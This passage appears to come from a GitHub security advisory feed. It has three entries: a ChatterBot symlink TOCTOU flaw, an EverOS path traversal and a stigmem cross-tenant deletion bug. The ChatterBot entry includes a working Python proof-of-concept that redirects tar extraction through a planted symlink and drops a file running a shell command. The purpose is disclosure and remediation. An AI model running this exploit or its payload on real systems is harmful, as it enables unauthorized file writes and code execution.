<p>ChatterBot's <code>UbuntuCorpusTrainer.extract()</code> uses a predictable, home-rooted output directory (<code>~/ubuntu_data/ubuntu_dialogs</code>) with a check-then-create pattern (<code>if not os.path.exists: os.makedirs</code>) followed by <code>tar.extractall(path=self.data_path)</code>. A local attacker who pre-plants a symlink at the predictable path causes <code>os.path.exists()</code> to return True (following the symlink), skipping <code>makedirs</code>, and subsequent <code>extractall</code> writes archive contents through the symlink to the attacker-chosen directory.</p>
<p>The existing <code>safe_extract</code> function validates tar <strong>member names</strong> (zip-slip defense) but does not validate the <strong>output directory</strong> itself — it cannot detect that <code>self.data_path</code> is a symlink. This is the defining distinction between the archive_extraction (zip-slip) and insecure_fs_create_toctou families.</p>
<h2 id="vulnerability-details">Vulnerability Details</h2>
<h3 id="predictable-output-directory-line-535-546">Predictable output directory (line 535-546)</h3>
<pre><code class="language-python">home_directory = os.path.expanduser('~')
self.data_directory = kwargs.get(
    'ubuntu_corpus_data_directory',
    os.path.join(home_directory, 'ubuntu_data')   # ~/ubuntu_data — predictable
)
self.data_path = os.path.join(
    self.data_directory, 'ubuntu_dialogs'          # ~/ubuntu_data/ubuntu_dialogs
)
</code></pre>
<h3 id="check-then-create-line-621-622">Check-then-create (line 621-622)</h3>
<pre><code class="language-python">def extract(self, file_path: str):
    if not os.path.exists(self.data_path):   # ← follows symlink → True → skips makedirs
        os.makedirs(self.data_path)          # ← never reached if symlink exists
</code></pre>
<h3 id="extraction-through-symlink-line-633-644">Extraction through symlink (line 633-644)</h3>
<pre><code class="language-python">def safe_extract(tar, path='.', members=None, *, numeric_owner=False):
    for member in tar.getmembers():
        member_path = os.path.join(path, member.name)
        if not is_within_directory(path, member_path):    # ← validates MEMBER names only
            raise Exception('Attempted Path Traversal in Tar File')
    tar.extractall(path, members, numeric_owner=numeric_owner)  # ← path is symlink → writes to target

safe_extract(tar, path=self.data_path, ...)   # self.data_path = symlink → attacker dir
</code></pre>
<p><code>safe_extract</code> calls <code>os.path.abspath(directory)</code> on <code>self.data_path</code> — this resolves the symlink, so the base becomes the attacker's target directory. All clean-named members trivially pass <code>is_within_directory</code> because they're relative to the resolved (attacker-controlled) base.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="environment">Environment</h3>
<table>
<thead>
<tr>
<th>Component</th>
<th>Detail</th>
</tr>
</thead>
<tbody><tr>
<td>chatterbot</td>
<td>1.2.13 (pip install)</td>
</tr>
<tr>
<td>Python</td>
<td>3.11.0</td>
</tr>
</tbody></table>
<h3 id="exploit">Exploit</h3>
<pre><code class="language-python">import os
import shutil
import sys
import tempfile
from pathlib import Path
from unittest.mock import patch

from chatterbot.trainers import UbuntuCorpusTrainer

ATTACKER_TARGET = Path(tempfile.mkdtemp(prefix="pwned_"))


def main():
    test_base = Path(tempfile.mkdtemp(prefix="cb_exploit_"))
    data_dir = test_base / "ubuntu_data"
    data_path = data_dir / "ubuntu_dialogs"
    data_dir.mkdir(parents=True, exist_ok=True)
    os.symlink(str(ATTACKER_TARGET), str(data_path))
    print(f"[1] Symlink planted: {data_path} -&gt; {ATTACKER_TARGET}")
    exists_check = os.path.exists(data_path)
    print(f"[2] os.path.exists(symlink) = {exists_check} (follows symlink → skips makedirs)")
    import tarfile
    import io
    tar_path = test_base / "corpus.tar.gz"
    with tarfile.open(str(tar_path), "w:gz") as tf:
        info = tarfile.TarInfo(name="dialog_001.tsv")
        payload = b"2024-01-01\tuser1\t0\tARBITRARY_CONTENT_VIA_SYMLINK\n"
        info.size = len(payload)
        tf.addfile(info, io.BytesIO(payload))

        info2 = tarfile.TarInfo(name="config.py")
        rce = b"import os; os.system('id &gt; /tmp/chatterbot_rce')\n"
        info2.size = len(rce)
        tf.addfile(info2, io.BytesIO(rce))
    if not os.path.exists(data_path):
        os.makedirs(data_path)
    def is_within_directory(directory, target):
        abs_directory = os.path.abspath(directory)
        abs_target = os.path.abspath(target)
        prefix = os.path.commonprefix([abs_directory, abs_target])
        return prefix == abs_directory

    with tarfile.open(str(tar_path), "r:gz") as tar:
        for member in tar.getmembers():
            member_path = os.path.join(str(data_path), member.name)
            if not is_within_directory(str(data_path), member_path):
                raise Exception("Attempted Path Traversal in Tar File")
        tar.extractall(str(data_path))

    print(f"[3] extractall(data_path) — data_path is symlink, writes to target")

    # Verify
    files = list(ATTACKER_TARGET.iterdir())
    if files:
        print(f"\n[+] EXPLOIT SUCCESSFUL — {len(files)} files in attacker directory:")
        for f in sorted(files):
            print(f"    {f.name}: {f.read_text().strip()[:60]}")
    else:
        print("[-] Failed")
        shutil.rmtree(str(test_base), ignore_errors=True)
        shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)
        sys.exit(1)

    shutil.rmtree(str(test_base), ignore_errors=True)
    shutil.rmtree(str(ATTACKER_TARGET), ignore_errors=True)
    sys.exit(0)


if __name__ == "__main__":
    print(f"chatterbot installed: {UbuntuCorpusTrainer.__module__}")
    print(f"Attacker target: {ATTACKER_TARGET}")
    print()
    main()
</code></pre>
<h3 id="poc-output">PoC output</h3>
<img width="1748" height="336" alt="image" src="https://github.com/user-attachments/assets/55a3fee5-0d3b-46d7-8e79-75aad34b322c">

<h2 id="suggested-fix">Suggested Fix</h2>
<p>Refuse symlinks on the output directory before extraction:</p>
<pre><code class="language-python">def extract(self, file_path: str):
    if os.path.islink(self.data_path):
        raise self.TrainerInitializationException(
            f'Refusing to extract to symlink: {self.data_path}')
    if not os.path.exists(self.data_path):
        os.makedirs(self.data_path)
    ...
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/gunthercox/ChatterBot/security/advisories/GHSA-wvrh-2f4m-924v">https://github.com/gunthercox/ChatterBot/security/advisories/GHSA-wvrh-2f4m-924v</a></li>
<li><a href="https://github.com/advisories/GHSA-wvrh-2f4m-924v">https://github.com/advisories/GHSA-wvrh-2f4m-924v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wvrh-2f4m-924v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-19T22:08:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[everos] EverOS: Path traversal in EverOS /api/v1/memory/add via unvalidated sender_id]]></title>
        <id>https://github.com/advisories/GHSA-c795-2g9c-j48m</id>
        <link href="https://github.com/advisories/GHSA-c795-2g9c-j48m"/>
        <updated>2026-06-19T21:43:15.000Z</updated>
        <content type="html"><![CDATA[<p>EverOS versions 1.0.0 and earlier are vulnerable to path traversal in the POST /api/v1/memory/add ingestion endpoint. The per-message sender_id field was not validated as a path-safe identifier (unlike app_id / project_id, which already enforced this). During user-memory extraction, sender_id is used as the owner_id and joined into the filesystem path where the extracted episode is persisted as a Markdown file. A sender_id containing ../ sequences could direct the write outside the configured memory root, allowing an unauthenticated caller to create or overwrite .md files at locations writable by the server process (unauthorized arbitrary file write). The file content is partially attacker-influenced.</p>
<p><strong>Patch</strong>:  Fixed in v1.0.1 with (1) path-safe validation on sender_id (character whitelist plus rejection of the . and .. tokens) and (2) a defense-in-depth containment check in the Markdown writer that rejects any write resolving outside the memory root before any filesystem access, covering both the write and the append read-modify-write paths.</p>
<p><strong>Remediation</strong>:  Upgrade to EverOS 1.0.1. There is no workaround for affected versions other than upgrading.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/EverMind-AI/EverOS/security/advisories/GHSA-c795-2g9c-j48m">https://github.com/EverMind-AI/EverOS/security/advisories/GHSA-c795-2g9c-j48m</a></li>
<li><a href="https://github.com/EverMind-AI/EverOS/releases/tag/v1.0.1">https://github.com/EverMind-AI/EverOS/releases/tag/v1.0.1</a></li>
<li><a href="https://github.com/advisories/GHSA-c795-2g9c-j48m">https://github.com/advisories/GHSA-c795-2g9c-j48m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c795-2g9c-j48m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:43:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[stigmem-node] stigmem-node: decay sweep expires and counts facts across all tenants (cross-tenant BOLA)]]></title>
        <id>https://github.com/advisories/GHSA-6gqw-jqv7-v88m</id>
        <link href="https://github.com/advisories/GHSA-6gqw-jqv7-v88m"/>
        <updated>2026-06-19T21:43:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>On a multi-tenant stigmem node, a caller holding a <code>write</code> credential for <strong>one</strong> tenant can run a decay sweep that acts on <strong>every</strong> tenant's facts. The candidate-selection queries in <code>lifecycle/decay.py</code> (<code>_select_ttl_candidates</code>, <code>_select_confidence_candidates</code>) carried no <code>tenant_id</code> predicate, and the caller's tenant was not threaded into the sweep or its async worker (<code>run_decay_sweep</code> / <code>_decay_job_worker</code>), reached via <code>POST /v1/decay/sweep</code>.</p>
<h3 id="impact">Impact</h3>
<p>A sweep with <code>ttl_seconds=0</code> expires <strong>all tenants'</strong> facts — cross-tenant data destruction (integrity and availability). A <code>dry_run</code> sweep returns a global candidate count, acting as a cross-tenant existence/volume <strong>oracle</strong> (information disclosure).</p>
<h3 id="affected-configurations">Affected configurations</h3>
<p>This is a cross-<strong>tenant</strong> break. It is exploitable <strong>only</strong> on deployments running the opt-in <code>stigmem-plugin-multi-tenant</code> (multiple tenants on one node). A default single-tenant node has only <code>tenant="default"</code> — there is no second tenant to cross — so it is <strong>not exploitable</strong> on default deployments. The rating is HIGH for the multi-tenant deployments the plugin exists to isolate.</p>
<h3 id="patches">Patches</h3>
<p>Fixed in <code>0.9.0a12</code> (PR #728): <code>identity.tenant_id</code> is threaded into <code>run_decay_sweep</code> and <code>_decay_job_worker</code>, and <code>AND tenant_id = ?</code> was added to the candidate selectors and the graph-sync. A tenant-B sweep now leaves tenant-A facts untouched, and <code>dry_run</code> counts only the caller's tenant. The <code>check_fact_query_tenant_scope.py</code> CI guard was extended to scan <code>lifecycle/</code> so this class cannot silently regress.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None other than upgrading to <code>0.9.0a12</code>. Single-tenant deployments are unaffected.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-6gqw-jqv7-v88m">https://github.com/eidetic-labs/stigmem/security/advisories/GHSA-6gqw-jqv7-v88m</a></li>
<li><a href="https://github.com/eidetic-labs/stigmem/pull/728">https://github.com/eidetic-labs/stigmem/pull/728</a></li>
<li><a href="https://github.com/advisories/GHSA-6gqw-jqv7-v88m">https://github.com/advisories/GHSA-6gqw-jqv7-v88m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6gqw-jqv7-v88m</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-06-19T21:43:02.000Z</published>
    </entry>
</feed>